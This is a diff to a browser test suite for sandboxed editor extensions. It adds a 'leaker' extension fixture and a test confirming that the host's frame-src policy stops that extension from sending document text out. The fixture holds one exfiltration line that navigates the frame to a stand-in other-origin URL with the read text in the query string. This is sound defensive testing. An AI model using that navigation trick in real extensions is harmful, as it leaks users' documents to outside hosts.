@@ -90,7 +90,17 @@ deExtension.activate(() => {
 });
 `;
 
+/** Reads the text it may read, then tries to carry it out by navigating its own frame (a review finding to close). */
+const LEAKER = `
+deExtension.activate(async (api) => {
+  const text = await api.text(await api.range(1, 4));
+  document.body.dataset.done = '1';
+  window.location.href = '__OTHER_ORIGIN__/secret.json?leak=' + encodeURIComponent(text);
+});
+`;
+
 const SCRIPTS: Record<string, string> = {
+  '/ext/leaker.js': LEAKER,
   '/ext/hostile.js': HOSTILE,
   '/ext/editor.js': EDITOR,
   '/ext/suggester.js': SUGGESTER,
@@ -163,7 +173,12 @@ test.beforeAll(async () => {
       );
     else if (path === '/host-page.js' || path === '/sandbox-runtime.js')
       send('text/javascript; charset=utf-8', read(path.slice(1)));
-    else if (SCRIPTS[path]) send('text/javascript; charset=utf-8', SCRIPTS[path]!);
+    else if (SCRIPTS[path])
+      // `localhost` is another origin than `127.0.0.1`, the host's.
+      send(
+        'text/javascript; charset=utf-8',
+        SCRIPTS[path]!.replaceAll('__OTHER_ORIGIN__', origin.replace('127.0.0.1', 'localhost')),
+      );
     else if (path === '/secret.json') {
       secretHits += 1;
       send('application/json', '{"secret":true}');
@@ -247,6 +262,20 @@ test.describe('a sandboxed extension (UX-060)', () => {
     ).toBe('allow-scripts');
     expect(page.url()).toBe(origin + '/');
     expect(await page.evaluate(() => localStorage.getItem('token'))).toBe('host-secret');
+  });
+
+  test('an extension cannot carry what it read out of the frame by navigating the frame itself', async ({
+    page,
+  }) => {
+    await open(page);
+    await install(page, manifest('ext.leaker', 'none', '/ext/leaker.js'));
+    // The extension reads, then navigates at once. The host page's `frame-src 'self'` refuses
+    // another origin: the request never reaches the server, so nothing the extension read leaves.
+    await page.waitForTimeout(1500);
+    expect(secretHits).toBe(0);
+    const frame = page.frames().find((f) => f !== page.mainFrame());
+    expect(frame?.url()).not.toContain('leak=');
+    expect(frame?.url()).not.toContain('localhost');
   });
 
   test('a call beyond the declared access is refused and logged, and the document is not touched', async ({
